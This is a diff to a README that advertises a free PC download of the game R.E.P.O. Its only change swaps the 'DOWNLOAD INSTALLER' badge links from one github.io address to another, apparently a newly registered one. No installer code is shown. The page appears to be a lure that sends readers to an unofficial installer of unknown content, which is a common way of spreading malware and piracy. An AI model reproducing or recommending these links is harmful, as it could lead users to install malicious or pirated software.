@@ -1,6 +1,6 @@
 # 🧠 R.E.P.O — Free PC Download & Installation Guide
 
-[![🤖 DOWNLOAD INSTALLER — R.E.P.O](https://img.shields.io/badge/🤖%20DOWNLOAD-INSTALLER%20%E2%80%94%20R.E.P.O-grey?style=for-the-badge&logo=ghost&logoColor=white)](https://ryadikmntiiks.github.io/.github/repodown)
+[![🤖 DOWNLOAD INSTALLER — R.E.P.O](https://img.shields.io/badge/🤖%20DOWNLOAD-INSTALLER%20%E2%80%94%20R.E.P.O-grey?style=for-the-badge&logo=ghost&logoColor=white)](https://r-e-p-o-download-game.github.io/.github)
 
 ## ⚙️ About the Game
 
@@ -23,7 +23,7 @@ Whether you prefer stealth or full-force firepower, **R.E.P.O** offers a modular
 
 ---
 
-[![🤖 DOWNLOAD INSTALLER — R.E.P.O](https://img.shields.io/badge/🤖%20DOWNLOAD-INSTALLER%20%E2%80%94%20R.E.P.O-grey?style=for-the-badge&logo=ghost&logoColor=white)](https://ryadikmntiiks.github.io/.github/repodown)
+[![🤖 DOWNLOAD INSTALLER — R.E.P.O](https://img.shields.io/badge/🤖%20DOWNLOAD-INSTALLER%20%E2%80%94%20R.E.P.O-grey?style=for-the-badge&logo=ghost&logoColor=white)](https://r-e-p-o-download-game.github.io/.github)
 
 ---
 
